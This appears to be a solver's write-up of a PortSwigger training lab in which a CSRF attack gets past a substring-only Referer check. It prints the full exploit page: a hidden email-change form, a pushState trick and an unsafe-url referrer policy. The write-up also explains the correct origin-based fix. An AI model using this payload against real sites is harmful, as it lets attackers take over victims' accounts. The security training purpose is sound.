# PortSwigger Lab — CSRF With Broken Referer Validation

**Lab:** CSRF with broken Referer validation
**Category:** Cross-Site Request Forgery (CSRF)
**Difficulty:** PRACTITIONER
**Lab page:** https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken
**Instance:** https://0a16000a032650bb8135fc5200c30027.web-security-academy.net/
**Solved:** 26 November 2026 — the victim's (carlos's) email was changed to `pwned@web-security-academy.net`; verified "Congratulations, you solved the lab!" banner on the instance home page.

## Vulnerability Type
Cross-Site Request Forgery with broken Referer validation — the server accepts any Referer header that merely CONTAINS the lab's domain anywhere, including inside a query string, so the attacker can put the domain in the exploit page's URL.

## Objective
Change the email address of the victim (carlos) by making the victim's browser send a Referer header that contains the lab's domain.

## Solution
1. Logged in as `wiener:peter` and confirmed a POST with `Referer: https://arbitrary-incorrect-domain.net?<lab-domain>` changes the email — the check is a substring match on the whole header. (One trap: this lab validates the Referer on the login POST too, so the login request itself must carry the lab's own URL as Referer, and "My account" in the nav is not proof of login — a failed login still shows it.)
2. Stored this exploit HTML on the lab's exploit server, with the head section carrying `Referrer-Policy: unsafe-url` (a full HTTP response head is required — status line first — or the store returns 400):
   Head: `HTTP/1.1 200 OK` + `Content-Type: text/html; charset=utf-8` + `Referrer-Policy: unsafe-url`
   Body: `<form method="POST" action="https://<instance>/my-account/change-email"><input type="hidden" name="email" value="pwned@web-security-academy.net"></form><script>history.pushState("", "", "/?<lab-domain>"); document.forms[0].submit();</script>`
   Browsers strip the query string from the Referer by default; the `unsafe-url` policy keeps the full URL (with the lab domain in the query) in the Referer.
3. Clicked "Deliver exploit to victim". The victim's browser ran `pushState` first, then submitted the form with a Referer containing the lab domain, and the email changed. The home page banner confirmed the lab solved.

## Practical Explanation
A substring check on the Referer is not a validation: the attacker controls the whole URL their page is served from, so they can embed the expected string anywhere in it. A correct Referer check must parse the header and compare the origin (scheme + host + port) exactly — and even then, Referer is only a second layer behind a real CSRF token.

## Lessons Learned
- Two ordering bugs hid this solve: the form's own auto-submit script fired before `pushState` (the form must not auto-submit itself), and the exploit-server head must be a complete HTTP response head, not just the extra header line.
- Always check what the stored exploit actually contains — the stored page showed the double submit script immediately.
- "Contains the domain" is not "comes from the domain" — parse and compare origins, never substring-match a header the attacker controls.
